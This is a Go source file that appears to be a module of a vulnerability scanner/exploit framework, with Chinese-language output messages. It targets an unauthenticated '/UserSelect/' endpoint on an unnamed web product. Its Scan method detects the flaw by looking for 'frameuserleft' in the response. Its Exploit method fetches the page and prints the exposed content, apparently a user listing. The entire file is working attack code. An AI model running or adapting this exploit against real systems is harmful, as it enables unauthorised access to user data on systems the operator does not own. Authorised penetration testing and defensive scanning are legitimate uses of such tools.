package vulners

import (
	"github.com/fatih/color"
	"strings"
)

type Wo03 struct {
}

func (s *Wo03) Scan(targetUrl string) {
	vulnerable, err := Wo03scancore(targetUrl)
	if err != nil {
		color.Red("[x]请求异常！")
		return
	}
	if vulnerable {
		color.Green("[Wo03] 存在UserSelect 未授权访问")
	} else {
		color.White("[Wo03] 不存在UserSelect 未授权访问")
	}
}

func (*Wo03) Exploit(targetUrl string) {
	runResult, err := Wo03runcore(targetUrl)
	if err != nil {
		color.Red("[x]漏洞利用异常！")
		return
	}
	if runResult != "" {
		color.Green(runResult)
	} else {
		color.White("[!]漏洞利用无返回结果")
	}
}

func Wo03scancore(targetUrl string) (bool, error) {
	url := "/UserSelect/"
	resp, err := baseClient.NewRequest().
		SetHeader("Content-Type", "application/x-www-form-urlencoded").
		Get(targetUrl + url)
	if err != nil {
		return false, err
	}
	resContent := resp.String()
	if strings.Contains(resContent, "frameuserleft") {
		return true, nil
	} else {
		return false, nil
	}
}

func Wo03runcore(targetUrl string) (string, error) {
	url := "/UserSelect/"
	resp, err := baseClient.NewRequest().
		SetHeader("Content-Type", "application/x-www-form-urlencoded").
		Get(targetUrl + url)
	if err != nil {
		return "", err
	}
	resContent := resp.String()

	if strings.Contains(resContent, "frameuserleft") {
		return "存在UserSelect 未授权访问\n" + resContent, nil
	} else {
		return "", nil
	}
}
